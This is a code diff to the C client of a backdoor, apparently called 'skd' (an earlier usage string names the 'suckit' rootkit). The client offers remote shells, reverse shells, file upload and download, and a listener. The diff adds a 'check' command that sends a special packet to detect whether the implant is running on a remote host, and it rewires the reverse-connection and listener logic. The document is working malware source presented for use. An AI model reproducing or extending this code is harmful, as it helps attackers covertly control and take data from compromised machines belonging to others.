@@ -58,7 +58,7 @@ int usage(char *s) {
         "      * down => download a file (-hdf required)\n"
         "      * up => uploads a file (-hdf required)\n"
         "      * listen => listen for a tty connection (-l required)\n"
-        "      * TODO:check => check if suckit is running on remote host (-hd required)\n"
+        "      * check => check if skd is running on remote host (-hd required)\n"
         "      * TODO:socks4a => opens a socks server in the client that forward the traffic through the server\n"
 		"   -c: connection type\n"
         "      * tcp => a direct tcp connection to the server\n"
@@ -242,6 +242,25 @@ int client_download(int sock, char *file) {
     return 0;
 }
 
+void client_check(int sockr) {
+    int nfd = 0;
+    struct timeval tv;
+
+    fd_set  fds;
+    FD_ZERO(&fds);
+    FD_SET(sockr, &fds); 
+    
+    // Timeout
+    tv.tv_sec=30;
+    tv.tv_usec=0;
+
+    nfd = select(sockr + 1, &fds, NULL, NULL, &tv);
+    if (nfd > 0 && FD_ISSET(sockr, &fds))
+        printf("FOUND an skd living on the other side!\n");
+    else
+        printf("NO skd living on the other side!\n");
+}
+
 void do_action(int action, int sockr, int sockw, char *file) {
     switch(action) {
         case UPLOAD:
@@ -256,9 +275,13 @@ void do_action(int action, int sockr, int sockw, char *file) {
             break;
         case SHELL:
         case REVSHELL:
-        case LISTEN:
             printf("Launching shell (scape character is ^K) \n");
             client_shell(sockr, sockw);
+            break;
+        case CHECK:
+        case REVCHECK:
+            printf("Waiting for the check response\n");
+            client_check(sockr);
             break;
         default:
             printf("Invalid option: %d\n", action);
@@ -390,9 +413,9 @@ void raw_action(int action, short local_port, char *host, short dest_port, char 
     }
 }
 
-void listen_action(short local_port) {
-    //TODO: for now, we always spawn a shell
-    start_daemon(SHELL, local_port, NULL, 0);
+void listen_action(int action, short local_port) {
+    //TODO: Send the action to do to the launcher
+    start_daemon(action, local_port, NULL, 0);
 }
 
 void tcp_action(int action, short local_port, char *host, short dest_port, char *file) {
@@ -446,6 +469,7 @@ int reverse_action(int action, short local_port, char *host, short dest_port, ch
         case UPLOAD: action = REVUPLOAD; break;
         case DOWNLOAD: action = REVDOWNLOAD; break;
         case SHELL: action = REVSHELL; break;
+        case CHECK: action = REVCHECK; break;
     }
 
     if ((pid = fork()) > 0) {
@@ -482,7 +506,10 @@ int reverse_action(int action, short local_port, char *host, short dest_port, ch
             }
 
             // Generate packet
-            memcpy(cmdpkt.pass, clientauth, 20);
+            if (action == REVCHECK)
+                memcpy(cmdpkt.pass, CHECKSTR, 20);
+            else
+                memcpy(cmdpkt.pass, clientauth, 20);
             cmdpkt.port = local_port;
             cmdpkt.action = action;
 			if (file) {
@@ -546,7 +573,7 @@ int main(int argc, char *argv[]) {
         ((con_type == CON_REV && ((!host) || (dest_port == -1) || (local_port == -1) ))) ||
         ((con_type == CON_RAW && ((!host) || (dest_port == -1) || (local_port == -1) ))) ||
         ((con_type == LISTEN && (local_port == -1))) ||
-        ((action == UPLOAD || action == DOWNLOAD) && (!file)) 
+        ((action == UPLOAD || action == DOWNLOAD) && (!file)) ||
 //		((action == SHELL)    && ((!host) || (dest_port == -1))) ||
 //		((action == UPLOAD)   && ((!host) || (dest_port == -1)   || (!file))) ||
 //		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
@@ -554,11 +581,13 @@ int main(int argc, char *argv[]) {
 //		(local_port == -1 && con_type != CON_TCP) || (action == -1) ||
 //      ((con_type == LISTEN && local_port == -1) ||
 ////		(con_type == -1) || (action == -1)
+        ((con_type == LISTEN) && (action != SHELL)) ||
+        (con_type == -1)
 		)  {
 			return usage(argv[0]);
 	}
 
-    get_pass();
+    if (action != CHECK) get_pass();
     sig_child(0);
 
 	// Launch selected action
@@ -573,7 +602,7 @@ int main(int argc, char *argv[]) {
 			raw_action(action, local_port, host, dest_port, file);
 			break;
 		case LISTEN:
-			listen_action(local_port);
+			listen_action(action, local_port);
 			break;
 	}
 
